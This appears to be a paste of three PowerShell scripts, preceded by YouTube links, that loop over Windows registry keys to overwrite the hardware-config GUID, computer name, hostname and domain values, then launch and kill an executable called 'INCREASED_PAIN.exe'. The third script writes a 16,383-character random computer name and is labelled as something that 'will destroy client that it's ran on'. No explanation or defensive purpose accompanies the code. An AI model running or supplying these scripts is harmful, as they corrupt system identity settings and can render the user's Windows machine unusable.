https://youtube.com/shorts/8nbgOg3h6rw?feature=share
https://youtube.com/shorts/wAE5hEgvOkc?feature=share
https://youtu.be/DPTdkEs_dQs


while($val -ne 0)
{
$val++
Write-Host $val

$Implant= "INCREASED_PAIN.exe"
$uuid = '{'+[guid]::NewGuid().ToString()+'}'

Set-ItemProperty -path "HKLM:\\SYSTEM\\HardwareConfig" -name "LastConfig" -value $uuid

& .$Implant
taskkill /IM $Implant /F
}
----------------------------
while($val -ne 0)
{
$val++
Write-Host $val
$names =@("ahahah","youdidntsayplz")
foreach ($ComputerName in $names){

$Implant= "INCREASED_PAIN.exe"
$uuid = '{'+[guid]::NewGuid().ToString()+'}'

Set-ItemProperty -path "HKLM:\\SYSTEM\\HardwareConfig" -name "LastConfig" -value $uuid

Remove-ItemProperty -path "HKLM:\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters" -name "Hostname"
Remove-ItemProperty -path "HKLM:\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters" -name "NV Hostname"
Set-ItemProperty -path "HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Computername\\Computername" -name "Computername" -value $ComputerName
Set-ItemProperty -path "HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Computername\\ActiveComputername" -name "Computername" -value $ComputerName
Set-ItemProperty -path "HKLM:\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters" -name "Hostname" -value $ComputerName
Set-ItemProperty -path "HKLM:\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters" -name "NV Hostname" -value  $ComputerName
Set-ItemProperty -path "HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" -name "AltDefaultDomainName" -value $ComputerName
Set-ItemProperty -path "HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" -name "DefaultDomainName" -value $ComputerName

& .$Implant
taskkill /IM $Implant /F}
}
----------------------------
DO NOT RUN OUTSIDE OF SANDBOX
this will destroy client that it's ran on!!



while($val -ne 5)
{
$val++
Write-Host $val
$names =@("ahahah","youdidntsayplz")
foreach ($ComputerName in $names){

$Implant= "INCREASED_PAIN.exe"
$uuid = '{'+[guid]::NewGuid().ToString()+'}'
$ComputerName = '{'+-join (((48..57)+(65..90)+(97..122)) * 80 |Get-Random -Count 16383 |%{[char]$\_})+'}'

Set-ItemProperty -path "HKLM:\\SYSTEM\\HardwareConfig" -name "LastConfig" -value $uuid

Remove-ItemProperty -path "HKLM:\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters" -name "Hostname"
Remove-ItemProperty -path "HKLM:\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters" -name "NV Hostname"
Set-ItemProperty -path "HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Computername\\Computername" -name "Computername" -value $ComputerName
Set-ItemProperty -path "HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Computername\\ActiveComputername" -name "Computername" -value $ComputerName
Set-ItemProperty -path "HKLM:\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters" -name "Hostname" -value $ComputerName
Set-ItemProperty -path "HKLM:\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters" -name "NV Hostname" -value  $ComputerName
Set-ItemProperty -path "HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" -name "AltDefaultDomainName" -value $ComputerName
Set-ItemProperty -path "HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" -name "DefaultDomainName" -value $ComputerName

& .$Implant
taskkill /IM $Implant /F
}
Remove-ItemProperty -path "HKLM:\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters" -name "Hostname"
Remove-ItemProperty -path "HKLM:\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters" -name "NV Hostname"
Set-ItemProperty -path "HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Computername\\Computername" -name "Computername" -value ComputerName
Set-ItemProperty -path "HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Computername\\ActiveComputername" -name "Computername" -value ComputerName
Set-ItemProperty -path "HKLM:\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters" -name "Hostname" -value ComputerName
Set-ItemProperty -path "HKLM:\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters" -name "NV Hostname" -value  ComputerName
Set-ItemProperty -path "HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" -name "AltDefaultDomainName" -value ComputerName
Set-ItemProperty -path "HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" -name "DefaultDomainName" -value ComputerName
}
